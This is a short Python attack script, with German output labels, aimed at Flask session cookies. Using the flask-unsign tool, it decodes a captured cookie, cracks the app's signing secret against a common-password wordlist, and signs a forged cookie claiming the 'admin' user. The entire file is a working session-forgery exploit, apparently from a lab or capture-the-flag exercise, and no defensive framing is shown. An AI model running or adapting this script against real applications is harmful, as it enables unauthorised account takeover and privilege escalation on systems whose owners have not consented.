import os
import subprocess
import flask_unsign_wordlist

found_cookie = "eyJjc3JmX3Rva2VuIjoiZTNmYjhhNGRkZWIzM2QwOGMxODBlZDQzNDQ3OTdiYjk1MDRmYzg4MiIsIm5hbWUiOiJ0ZXN0In0.Zn22vQ.Dz-xmi6dTHo_DnATkQ_Z9Ch3zAs"

cookie_result = subprocess.run(['flask-unsign', '--decode', '--cookie', found_cookie], capture_output=True, text=True)
print("Decodierter Cookie: ", cookie_result.stdout)

secret = subprocess.run(['flask-unsign', '--unsign', '--cookie', found_cookie, '--wordlist', './10k-most-common.txt', '--no-literal-eval'], capture_output=True, text=True)
secret_key = secret.stdout
print("Secret: ", secret_key)

cookie_content= "{'name': 'admin'}"
crafted_cookie = subprocess.run(['flask-unsign', '--sign', '--cookie', cookie_content, '--secret', secret_key], capture_output=True, text=True)
print("Selbst signierter Cookie: ", crafted_cookie.stdout)
